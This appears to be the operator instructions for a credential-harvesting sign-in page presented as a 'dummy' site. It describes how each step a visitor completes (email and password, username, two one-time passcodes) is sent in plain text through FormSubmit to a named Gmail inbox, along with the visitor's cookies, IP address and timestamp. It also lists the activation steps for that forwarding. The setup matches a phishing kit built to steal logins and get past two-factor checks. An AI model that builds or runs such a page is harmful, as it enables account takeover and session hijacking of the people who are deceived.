How this works:

Whenever a dummy user goes through the sign-in steps on the main page (index.html), each piece of information is sent to this email address in plain text almost immediately via FormSubmit.

  • Step 1 – Email + Password (sent immediately)
  • Step 2 – Username (sent immediately)
  • Step 3 – OTP 1 (sent immediately)
  • Step 4 – OTP 2 (sent immediately)

Every email also includes:

  • Cookies (plain text)
  • IP Address
  • Timestamp

Check the inbox (and spam folder) of blessedresult6@gmail.com for emails whose subject starts with Dummy Sign-In - ....

There is no real-time list here because this is a static dummy site with no backend. All data arrives only by email in plain text.


Important first-time setup:

  1. Open the user page once and submit any dummy data.
  2. FormSubmit will send a confirmation email to blessedresult6@gmail.com.
  3. Click the activation link in that email. After that, all future submissions will arrive automatically.
